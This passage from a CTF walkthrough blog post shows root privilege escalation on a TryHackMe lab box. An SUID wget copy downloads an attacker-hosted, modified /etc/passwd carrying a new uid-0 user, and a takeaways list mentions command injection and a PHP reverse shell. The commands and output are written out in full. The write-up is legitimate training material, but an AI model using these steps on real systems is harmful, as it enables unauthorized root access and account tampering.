+</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">odus</code> appears to be an interesting file, an exact copy of the <code class="language-plaintext highlighter-rouge">wget</code> binary with SUID permissions.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+</pre><td class="rouge-code"><pre>Mid_PrivShell <span class="nv">$:</span> <span class="nb">ls</span> <span class="nt">-la</span>
+<span class="nb">ls</span> <span class="nt">-la</span>
+total 552
+drwxr-xr-x  2 root root   4096 May  5  2021 <span class="nb">.</span>
+drwxr-xr-x 12 root root   4096 May  5  2021 ..
+<span class="nt">-rw-r--r--</span>  1 root root     65 May  5  2021 fl4g_2.txt
+<span class="nt">-rw-r--r--</span>  1 root root    273 May  5  2021 note.txt
+<span class="nt">-rwsr-sr-x</span>  1 root root 548568 Jul 25  2019 odus
+
+Mid_PrivShell <span class="nv">$:</span> ./odus <span class="nt">-h</span>
+./odus <span class="nt">-h</span>
+GNU Wget 1.20.3, a non-interactive network retriever.
+Usage: odus <span class="o">[</span>OPTION]... <span class="o">[</span>URL]...
+
+Mandatory arguments to long options are mandatory <span class="k">for </span>short options too.
+
+Startup:
+  <span class="nt">-V</span>,  <span class="nt">--version</span>                   display the version of Wget and <span class="nb">exit</span>
+  <span class="nt">-h</span>,  <span class="nt">--help</span>                      print this <span class="nb">help</span>
+  <span class="nt">-b</span>,  <span class="nt">--background</span>                go to background after startup
+  <span class="nt">-e</span>,  <span class="nt">--execute</span><span class="o">=</span>COMMAND           execute a <span class="sb">`</span>.wgetrc<span class="s1">'-style command
+
+Logging and input file:
+  -o,  --output-file=FILE          log messages to FILE
+  -a,  --append-output=FILE        append messages to FILE
+  -d,  --debug                     print lots of debugging information
+  -q,  --quiet                     quiet (no output)
+  -v,  --verbose                   be verbose (this is the default)
+  -nv, --no-verbose                turn off verboseness, without being quiet
+       --report-speed=TYPE         output bandwidth as TYPE.  TYPE can be bits
+  -i,  --input-file=FILE           download URLs found in local or external FILE
+  -F,  --force-html                treat input file as HTML
+  -B,  --base=URL                  resolves HTML input-file links (-i -F)
+                                     relative to URL
+       --config=FILE               specify config file to use
+       --no-config                 do not read any config file
+       --rejected-log=FILE         log reasons for URL rejection to FILE
+
+Download:...
+
+</span></pre></table></code></div></div><h2 id="root-privilege-escalation">Root Privilege Escalation:</h2><p>To obtain a root shell, we can exploit this binary by modifying the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file. Let’s exploit. Check out an aw0some <code class="language-plaintext highlighter-rouge">wget</code> privilege escalations <a href="https://www.hackingarticles.in/linux-for-pentester-wget-privilege-escalation/">Article</a> here.</p><p>First, take a look at the target machine’s <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file and copy it to our host machine.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+</pre><td class="rouge-code"><pre>Mid_PrivShell <span class="nv">$:</span> <span class="nb">cat</span> /etc/passwd
+<span class="nb">cat</span> /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+<span class="nb">sync</span>:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+john:x:1000:1000::/home/john:/bin/bash
+systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:104:105::/nonexistent:/usr/sbin/nologin
+sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+ftp:x:106:108:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
+david:x:1001:1001::/home/david:/bin/bash
+
+Mid_PrivShell <span class="nv">$:</span> 
+
+</pre></table></code></div></div><p>On our host machine with help of <code class="language-plaintext highlighter-rouge">openssl</code> tool we are creating password for our new user called <code class="language-plaintext highlighter-rouge">anon</code>.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>➜ openssl passwd <span class="nt">-1</span> <span class="nt">-salt</span> anon anon
+<span class="nv">$1$anon$G05</span>/IEkCfH5/MvkGBhHbe0
+
+➜ 
+</pre></table></code></div></div><p>Next, we add our new user, <code class="language-plaintext highlighter-rouge">anon</code> with root privileges to the <code class="language-plaintext highlighter-rouge">passwd</code> file by appending the entry at the bottom line.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+</pre><td class="rouge-code"><pre>
+➜  <span class="nb">cat </span>passwd                                                          
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+<span class="nb">sync</span>:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+john:x:1000:1000::/home/john:/bin/bash
+systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:104:105::/nonexistent:/usr/sbin/nologin
+sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+ftp:x:106:108:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
+david:x:1001:1001::/home/david:/bin/bash
+anon:<span class="nv">$1$anon$G05</span>/IEkCfH5/MvkGBhHbe0:0:0:root:/root:/bin/bash
+
+➜  
+
+</pre></table></code></div></div><p>Now, we start a <code class="language-plaintext highlighter-rouge">python</code> HTTP server to transfer the modified <code class="language-plaintext highlighter-rouge">passwd</code> file to the target machine.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>➜ python <span class="nt">-m</span> http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 <span class="o">(</span>http://0.0.0.0:8000/<span class="o">)</span> ...
+192.168.20.15 - - <span class="o">[</span>28/Feb/2025 03:21:27] <span class="s2">"GET /passwd HTTP/1.1"</span> 200 -
+
+</pre></table></code></div></div><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre><td class="rouge-code"><pre>Mid_PrivShell <span class="nv">$:</span> ./odus <span class="nt">-O</span> /etc/passwd http://192.168.20.2:8000/passwd
+./odus <span class="nt">-O</span> /etc/passwd http://192.168.20.2:8000/passwd
+<span class="nt">--2025-02-28</span> 13:51:27--  http://192.168.20.2:8000/passwd
+Connecting to 192.168.20.2:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1457 <span class="o">(</span>1.4K<span class="o">)</span> <span class="o">[</span>application/octet-stream]
+Saving to: ‘/etc/passwd’
+
+/etc/passwd         100%[<span class="o">===================&gt;]</span>   1.42K  <span class="nt">--</span>.-KB/s    <span class="k">in </span>0s      
+
+2025-02-28 13:51:27 <span class="o">(</span>2.92 MB/s<span class="o">)</span> - ‘/etc/passwd’ saved <span class="o">[</span>1457/1457]
+
+Mid_PrivShell <span class="nv">$:</span> 
+
+</pre></table></code></div></div><p>BOOM!! We can now switch to the user <code class="language-plaintext highlighter-rouge">anon</code> we created with root privileges and retrieve the root flag from the <code class="language-plaintext highlighter-rouge">/root</code> directory.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+</pre><td class="rouge-code"><pre>Mid_PrivShell <span class="nv">$:</span> su anon
+su anon
+Password: anon
+
+ <span class="k">*</span> Starting OpenBSD Secure Shell server sshd                             <span class="o">[</span> OK <span class="o">]</span> 
+ <span class="k">*</span> Starting FTP server vsftpd                                                   /usr/sbin/vsftpd already running.
+                                                                         <span class="o">[</span> OK <span class="o">]</span>
+ <span class="k">*</span> Starting Apache httpd web server apache2                                      <span class="k">*</span> 
+<span class="o">[</span>R00t_Shell] <span class="nv">$:</span> <span class="nb">whoami 
+whoami
+</span>root
+<span class="o">[</span>R00t_Shell] <span class="nv">$:</span> <span class="nb">cd</span> /root
+<span class="nb">cd</span> /root
+<span class="o">[</span>R00t_Shell] <span class="nv">$:</span> <span class="nb">ls
+ls
+</span>r00t_fl4g.txt
+<span class="o">[</span>R00t_Shell] <span class="nv">$:</span> <span class="nb">cat </span>r00t_fl4g.txt 
+<span class="nb">cat </span>r00t_fl4g.txt
+Congrats .. You compromised The Server!! 
+
+This is your root flag:
+a8df5e52c<span class="o">{</span>REDACTED<span class="o">}</span>
+
+
+
+
+
+
+Next Challenge will be released soon...stay tuned
+
+<span class="o">[</span>R00t_Shell] <span class="nv">$:</span>
+
+</pre></table></code></div></div><h3 id="you-can-submit-all-three-flags-here-tricksterctf">You can submit all three flags here: <a href="https://tryhackme.com/jr/tricksterctf">TricksterCTF</a></h3><h2 id="key-takeaways-from-this-walkthrough">Key Takeaways from This Walkthrough,</h2><p>Throughout this CTF challenge, we explored various enumeration and exploitation techniques, including:</p><ul><li><em>Identifying the Target:</em> Using <code class="language-plaintext highlighter-rouge">nmap</code> and <code class="language-plaintext highlighter-rouge">netdiscover</code> to find the machine’s IP.<li><em>Port Scanning:</em> Performing an <code class="language-plaintext highlighter-rouge">nmap</code> scan to identify open ports and running services.<li><em>Web Enumeration:</em> Discovering hidden files using <code class="language-plaintext highlighter-rouge">gobuster</code> and analyzing web parameters.<li><em>Command Injection:</em> Exploiting a vulnerable URL parameter to gain initial access.<li><em>Reverse Shell:</em> Uploading a PHP reverse shell and setting up a listener.<li>Privilege Escalation:<ul><li>Abusing <code class="language-plaintext highlighter-rouge">vim</code> SUDO privileges to switch to <code class="language-plaintext highlighter-rouge">john</code>.<li>Decoding credentials from encoded strings to access <code class="language-plaintext highlighter-rouge">david</code>.<li>Exploiting an SUID <code class="language-plaintext highlighter-rouge">wget</code> binary (<code class="language-plaintext highlighter-rouge">odus</code>) to gain root access.<li>Modifying <code class="language-plaintext highlighter-rouge">/etc/passwd</code>: Creating a new root user to achieve full system control.</ul></ul><p>This challenge covered fundamental penetration testing concepts, from enumeration to privilege escalation, making it a great learning experience for CTF enthusiasts.</p><h2 id="thank-you-for-reading-my-walkthough-happy-h4cking">Thank you for reading my walkthough! Happy H4cking!!!</h2></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/blog/categories/boot2root/'>Boot2Root</a>, <a href='/blog/categories/tryhackme/'>TryHackMe</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/blog/tags/easy/" class="post-tag no-text-decoration" >easy</a> <a href="/blog/tags/rce/" class="post-tag no-text-decoration" >rce</a> <a href="/blog/tags/privesc/" class="post-tag no-text-decoration" >privesc</a> <a href="/blog/tags/linux/" class="post-tag no-text-decoration" >linux</a> <a href="/blog/tags/gtfobin/" class="post-tag no-text-decoration" >gtfobin</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=TricksterCTF - TryHackMe - an0n4ce&url=https://an0n4ce.github.io/blog/posts/tricksterctf-tryhackme-writeup/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=TricksterCTF - TryHackMe - an0n4ce&u=https://an0n4ce.github.io/blog/posts/tricksterctf-tryhackme-writeup/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=TricksterCTF - TryHackMe - an0n4ce&url=https://an0n4ce.github.io/blog/posts/tricksterctf-tryhackme-writeup/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink('', 'Link copied successfully!')" data-toggle="tooltip" data-placement="top" title="Copy link"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/blog/posts/the-sticker-shop-tryhackme/">The Sticker Shop - TryHackMe</a><li><a href="/blog/posts/tricksterctf-tryhackme-writeup/">TricksterCTF - TryHackMe</a><li><a href="/blog/posts/explore-hackthebox/">Explore - HackTheBox</a><li><a href="/blog/posts/smag-grotto-tryhackme/">Smag Grotto - TryHackMe</a><li><a href="/blog/posts/domectf-2021-writeup/">DomeCTF 2021</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/blog/tags/linux/">linux</a> <a class="post-tag" href="/blog/tags/privesc/">privesc</a> <a class="post-tag" href="/blog/tags/ctf/">ctf</a> <a class="post-tag" href="/blog/tags/easy/">easy</a> <a class="post-tag" href="/blog/tags/gtfobin/">gtfobin</a> <a class="post-tag" href="/blog/tags/box/">box</a> <a class="post-tag" href="/blog/tags/cve/">cve</a> <a class="post-tag" href="/blog/tags/adb/">adb</a> <a class="post-tag" href="/blog/tags/android/">android</a> <a class="post-tag" href="/blog/tags/code/">code</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/blog/posts/smag-grotto-tryhackme/"><div class="card-body"> <span class="timeago small" >Sep 1, 2021<i class="unloaded">2021-09-01T22:30:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Smag Grotto - TryHackMe</h3><div class="text-muted small"><p> Room : https://tryhackme.com/room/smaggrotto Author : @jakeyee Reconnaissance: Let’s start with nmap scan. Discoverd 2 Ports, Let’s check port 80. Enumeration: From gobuster result we w...</p></div></div></a></div><div class="card"> <a href="/blog/posts/colddbox-easy-tryhackme/"><div class="card-body"> <span class="timeago small" >Sep 1, 2021<i class="unloaded">2021-09-01T23:30:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>ColddBox:Easy - TryHackMe</h3><div class="text-muted small"><p> Room : https://tryhackme.com/room/colddboxeasy Author : @martinfriasc Reconnaissance: Let’s start with nmap scan. Only port 80 is open lets’s check it. We can see server is running wordp...</p></div></div></a></div><div class="card"> <a href="/blog/posts/year-of-the-jellyfish-tryhackme/"><div class="card-body"> <span class="timeago small" >Sep 2, 2021<i class="unloaded">2021-09-02T09:30:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Year Of the JellyFish - TryHackMe</h3><div class="text-muted small"><p> Room: https://tryhackme.com/room/yearofthejellyfish This article is about the room Year Of The JellyFish capture the flag created by MuirlandOracle on TryHackMe. This box is part of an OSCP vou...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/blog/posts/explore-hackthebox/" class="btn btn-outline-primary" prompt="Older"><p>Explore - HackTheBox</p></a> <a href="/blog/posts/the-sticker-shop-tryhackme/" class="btn btn-outline-primary" prompt="Newer"><p>The Sticker Shop - TryHackMe</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2026 <a href="https://twitter.com/an0n4ce">Vishnu Sudhakaran</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://an0n4ce.github.io" target="_blank" rel="noopener">an0n4ce</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/blog/tags/linux/">linux</a> <a class="post-tag" href="/blog/tags/privesc/">privesc</a> <a class="post-tag" href="/blog/tags/ctf/">ctf</a> <a class="post-tag" href="/blog/tags/easy/">easy</a> <a class="post-tag" href="/blog/tags/gtfobin/">gtfobin</a> <a class="post-tag" href="/blog/tags/box/">box</a> <a class="post-tag" href="/blog/tags/cve/">cve</a> <a class="post-tag" href="/blog/tags/adb/">adb</a> <a class="post-tag" href="/blog/tags/android/">android</a> <a class="post-tag" href="/blog/tags/code/">code</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/blog/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://an0n4ce.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/blog/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/blog/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-P5KFKWQ6YG"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-P5KFKWQ6YG'); }); </script>
